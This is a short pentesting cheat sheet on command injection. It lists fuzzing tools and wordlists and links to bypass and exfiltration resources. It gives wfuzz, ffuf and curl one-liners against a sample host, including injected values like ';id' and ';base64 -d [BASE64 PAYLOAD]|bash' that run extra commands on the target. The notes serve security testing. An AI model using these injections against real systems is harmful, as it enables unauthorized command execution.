# Command Injection

## Things to remember
  *  Commands and syntax will depend on the underlying OS, enumerate web stack properly
  *  Keep an eye out for filters such as case-sensitivity, whitespace removal, etc.
      *  PayloadsAllTheThings has a [list of bypass techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)
  *  HackTricks has a page covering some [different exfil techniques](https://book.hacktricks.xyz/pentesting-web/command-injection)

## Useful tools
  *  [`wfuzz`](https://www.kali.org/tools/wfuzz/) and [`ffuf`](https://github.com/ffuf/ffuf) for manually fuzzing web app inputs for command injection
  *  [`seclists`](https://github.com/danielmiessler/SecLists) for some command injection fuzzing lists
  *  [`ping`](https://linux.die.net/man/8/ping), [`curl`](https://curl.se/), and [`wget`](https://www.gnu.org/software/wget/) for generating network traffic upon injection
  *  [`tcpdump`](https://www.tcpdump.org/) and [`python3 web server`](https://docs.python.org/3/library/http.server.html) for sniffing network traffic generated upon injection
  *  [`base64`](https://linux.die.net/man/1/base64) for encoding more complex commands
  *  [`curl`](https://curl.se/) for performing command injection one-liners

## Fuzzing for command injection
  *  `wfuzz` and `ffuf` for command injection fuzzing
      *  Fuzz more than just parameters! Cookies, headers, etc.
  *  Carefully parse HTTP POST requests before using `wfuzz`
      *  Be specific with things like cookies, headers, URL structure, etc.
      *  Failing to provide these values can produce ineffective requests
  *  `ffuf` can parse requests from text files
      *  Easier handling of more complex POST requests
      *  No recursive grep, consider `Burp Intruder` in these cases
  *  Wordlists with injection techniques are best found on GitHub

```
wfuzz -w /path/to/cmd-inj.txt -b 'exampleCookie=cookieValue' 'http://10.0.0.1/cmd?param=FUZZ'
wfuzz -w /path/to/cmd-inj.txt -H 'exampleHeader: headerValue' -d 'param=FUZZ' 'http://10.0.0.1/cmd'
```

```
ffuf -request req.txt --request-proto http -w /path/to/cmd-inj.txt -v
```

## Exploiting command injection
  *  Successful injection may not be visible
      *  Consider a command that will generate network traffic
      *  `ping` and `tcpdump`, `curl` and `python3 web server`, etc.
  *  `base64` useful for avoiding string escape situations
  *  `curl` in-line HTTP GET parameters must be URL encoded

```
curl -G --data-urlencode 'param=;id' -b 'exampleCookie=cookieValue' 'http://10.0.0.1/cmd'
curl -k -X 'POST' -H 'exampleHeader: headerValue' --data-urlencode 'param=;base64 -d [BASE64 PAYLOAD]|bash' 'https://10.0.0.1/cmd'
```
